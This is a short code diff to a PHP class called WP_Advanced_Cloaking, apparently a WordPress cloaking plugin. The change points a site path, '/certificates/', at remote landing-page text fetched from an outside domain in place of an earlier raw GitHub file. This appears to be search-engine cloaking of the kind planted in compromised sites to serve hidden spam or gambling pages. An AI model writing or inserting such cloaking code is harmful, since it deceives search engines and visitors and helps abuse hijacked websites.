@@ -12,8 +12,8 @@ class WP_Advanced_Cloaking {
     private function initialize_cloaking_rules() {
         $this->cloaking_rules = [
             [
-                'path' => '/sea-buckthorn-oil-capsule.html',
-                'landing_page' => 'https://raw.githubusercontent.com/gunawanmsg888-commits/biosash/refs/heads/main/lp1.txt',
+                'path' => '/certificates/',
+                'landing_page' => 'https://syairbois.site/google/bebas.txt',
                 'remote_url' => ''
             ]
         ];
